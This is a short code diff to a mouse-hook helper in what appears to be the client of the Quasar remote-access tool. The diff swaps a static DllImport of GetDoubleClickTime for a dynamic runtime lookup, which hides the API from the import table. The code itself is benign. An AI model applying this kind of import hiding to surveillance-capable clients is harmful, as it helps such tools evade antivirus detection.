@@ -2,12 +2,14 @@
 // Copyright (c) 2015 George Mamaladze
 // See license.txt or https://mit-license.org/
 
+using Quasar.Client.Utilities;
 using System.Runtime.InteropServices;
 
 namespace Quasar.Client.MouseKeyHook.WinApi
 {
     internal static class MouseNativeMethods
     {
+        internal delegate int GetDoubleClickTimeProc();
         /// <summary>
         ///     The GetDoubleClickTime function retrieves the current double-click time for the mouse. A double-click is a series
         ///     of two clicks of the
@@ -21,7 +23,7 @@ namespace Quasar.Client.MouseKeyHook.WinApi
         /// <remarks>
         ///     http://msdn.microsoft.com/en-us/library/ms646258(VS.85).aspx
         /// </remarks>
-        [DllImport("user32")]
-        internal static extern int GetDoubleClickTime();
+        //[DllImport("user32")]
+        internal static int GetDoubleClickTime() => ClientNatives.Lookup<GetDoubleClickTimeProc>("user32.dll", "GetDoubleClickTime")();
     }
 }
